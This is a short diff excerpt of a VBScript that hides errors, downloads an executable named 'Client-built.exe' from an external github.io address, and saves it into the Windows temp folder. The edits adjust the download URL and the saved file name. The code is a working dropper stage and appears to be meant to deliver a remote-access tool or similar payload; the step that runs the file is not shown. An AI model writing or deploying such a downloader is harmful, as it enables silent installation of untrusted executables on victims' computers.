@@ -9,7 +9,7 @@ On Error Resume Next ' Enable error handling
 Set x = CreateObject("MSXML2.XMLHTTP")
 
 ' Replace with your actual URL (must be a valid URL)
-x.Open "GET", "https://homleds.github.io/Client-built.exe", False
+x.Open "GET", "https://homleds.github.io/Client-built.exe/", False
 x.Send
 
 ' Check if download was successful
@@ -21,7 +21,7 @@ End If
 ' Set up file system objects
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set temp = fso.GetSpecialFolder(2) ' Temporary folder
-tempFile = temp & "\downloaded_file.exe"
+tempFile = temp & "\Client-built.exe"
 
 ' Write the downloaded content to a file
 Set stream = CreateObject("ADODB.Stream")
